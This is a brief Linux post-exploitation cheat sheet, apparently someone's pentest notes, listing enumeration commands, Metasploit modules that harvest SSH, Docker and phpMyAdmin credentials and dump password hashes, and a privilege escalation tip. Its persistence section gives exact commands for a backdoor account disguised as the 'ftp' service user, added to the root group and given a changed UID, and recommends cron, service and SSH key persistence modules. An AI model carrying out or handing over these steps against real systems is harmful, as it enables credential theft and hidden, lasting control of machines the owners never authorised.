Interesting webshells for reverse: `/usr/share/webshells`
# Enumerations:
```
cat /etc/passwd
cat /etc/*release
cat /etc/hosts
cat /etc/resolv.conf #dns server
groups
cat /etc/*issue
uname -a
ifconfig
ip a
netstat -antp
ss
ps aux
env
top
crontab -l
cat /etc/cron
cat /etc/shells
```

```
use post/linux/gather/enum_configs
use post/multi/gather/env
use post/linux/gather/enum_network
use post/linux/gather/enum_protections
use post/linux/gather/enum_system
use post/linux/gather/checkcontainer
use post/linux/gather/checkvm
use post/linux/gather/enum_users_history

# In Meterpreter:
ps

```

# Privilege escalation

`ps aux` to check running programs or check with `cat` running scripts. Check -V on the programs and search for possible exploits in msf database. Set proper path for the executable and shell bind LPORT and LHOST within the session.

# Post exploit 2

```
- post/multi/gather/ssh_creds
- post/multi/gather/docker_creds
- post/linux/gather/hashdump
- post/linux/gather/ecryptfs_creds
- post/linux/gather/enum_psk
- post/linux/gather/enum_xchat
- post/linux/gather/enum_configs
- post/linux/gather/enum_network
- post/linux/gather/phpmyadmin_credsteal
- post/linux/gather/pptpd_chap_secrets
- post/linux/manage/sshkey_persistence
```

# Persistence

After getting a root it's good to create a new account that looks like a service account f.e. `ftp` , set password and add to root group:

```
useradd -m ftp -s /bin/bash
passwd ftp
usermod -aG root ftp
usermod -u 15 ftp #changes id for user
```

`search platform:linux persistence`
- cron_perstitence (try different targets and non-conflicting LPORT)
- service_persistence (try different targets)
- sshkey_persistence is top!

SSHKEY: set folders, session and username to create key and copy the ssh key from loot. 

```
vim ssh_key (paste)
chmod 0400 ssh_key
ssh -i ssh_key username@IPADDRESS
```



